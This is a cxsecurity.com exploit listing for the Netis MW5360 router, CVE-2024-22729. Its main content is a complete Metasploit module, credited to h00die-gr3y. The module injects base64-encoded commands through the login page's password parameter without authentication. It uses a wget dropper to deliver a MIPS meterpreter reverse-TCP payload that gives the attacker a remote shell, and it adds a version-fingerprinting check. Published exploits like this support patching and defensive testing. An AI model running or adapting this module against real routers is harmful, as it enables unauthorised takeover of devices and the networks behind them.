---
title: Netis MW5360 Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2024060058
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-25
fetch_date: 2025-10-06T16:54:37.722093
---

# Netis MW5360 Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Netis MW5360 Remote Command Execution** **2024.06.24**  Credit:  **[h00die-gr3y](https://cxsecurity.com/author/h00die-gr3y/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
include Msf::Exploit::FileDropper
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Netis router MW5360 unauthenticated RCE.',
'Description' => %q{
Netis router MW5360 has a command injection vulnerability via the password parameter on the login page.
The vulnerability stems from improper handling of the "password" parameter within the router's web interface.
The router's login page authorization can be bypassed by simply deleting the authorization header,
leading to the vulnerability. All router firmware versions up to `V1.0.1.3442` are vulnerable.
Attackers can inject a command in the 'password' parameter, encoded in base64, to exploit the command injection
vulnerability. When exploited, this can lead to unauthorized command execution, potentially allowing the attacker
to take control of the router.
},
'License' => MSF\_LICENSE,
'Author' => [
'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
'Adhikara13' # Discovery of the vulnerability
],
'References' => [
['CVE', '2024-22729'],
['URL', 'https://attackerkb.com/topics/MvCphsf4LN/cve-2024-22729'],
['URL', 'https://github.com/adhikara13/CVE/blob/main/netis\_MW5360/blind%20command%20injection%20in%20password%20parameter%20in%20initial%20settings.md']
],
'DisclosureDate' => '2024-01-11',
'Platform' => ['linux'],
'Arch' => [ARCH\_MIPSLE],
'Privileged' => true,
'Targets' => [
[
'Linux Dropper',
{
'Platform' => ['linux'],
'Arch' => [ARCH\_MIPSLE],
'Type' => :linux\_dropper,
'CmdStagerFlavor' => ['wget'],
'DefaultOptions' => {
'PAYLOAD' => 'linux/mipsle/meterpreter\_reverse\_tcp'
}
}
]
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'SSL' => false,
'RPORT' => 80
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
register\_options([
OptString.new('TARGETURI', [ true, 'The Netis MW5360 router endpoint URL', '/' ]),
OptInt.new('CMD\_DELAY', [true, 'Delay in seconds between payload commands to avoid locking', 30])
])
end
def execute\_command(cmd, \_opts = {})
# cleanup payload file when session is established.
if cmd.include?('chmod +x')
register\_files\_for\_cleanup(cmd.split('+x')[1].strip)
end
# skip last command to remove payload because it does not work
unless cmd.include?('rm -f')
payload = Base64.strict\_encode64("`#{cmd}`")
print\_status("Executing #{cmd}")
send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, '/cgi-bin/skk\_set.cgi'),
'vars\_post' => {
'password' => payload,
'quick\_set' => 'ap',
'app' => 'wan\_set\_shortcut'
}
})
end
end
def check
print\_status("Checking if #{peer} can be exploited.")
res = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, '/cgi-bin/skk\_get.cgi'),
'vars\_post' => {
'mode\_name' => 'skk\_get',
'wl\_link' => 0
}
})
return CheckCode::Unknown('No valid response received from target.') unless res && res.code == 200 && res.body.include?('version')
# trying to get the model and version number
# unfortunately JSON parsing fails, so we need to use this ugly REGEX :-(
version = res.body.match(/.?(version).?\s\*:\s\*.?((\\|[^,])\*)/)
# when found, remove whitespaces and make all uppercase to avoid suprises in string splitting and comparison
unless version.nil?
version\_number = version[2].upcase.split('-V')[1].gsub(/[[:space:]]/, '').chop
# The model number part is usually something like Netis(NC63), but occassionally you see things like Stonet-N3D
if version[2].upcase.split('-V')[0].include?('-')
model\_number = version[2].upcase.split('-V')[0][/-([^-]+)/, 1].gsub(/[[:space:]]/, '')
else
model\_number = version[2].upcase.split('-V')[0][/\(([^)]+)/, 1].gsub(/[[:space:]]/, '')
end
# Check if target is model MW5360 and running firmware 1.0.1.3442 (newest release 2024-04-24) or lower
if version\_number && model\_number == 'MW5360' && (Rex::Version.new(version\_number) <= Rex::Version.new('1.0.1.3442'))
return CheckCode::Appears(version[2].chop.to\_s)
end
return CheckCode::Safe(version[2].chop.to\_s)
end
CheckCode::Safe
end
def exploit
print\_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
case target['Type']
when :linux\_dropper
# Don't check the response here since the server won't respond
# if the payload is successfully executed
execute\_cmdstager(noconcat: true, delay: datastore['CMD\_DELAY'])
end
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060058)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top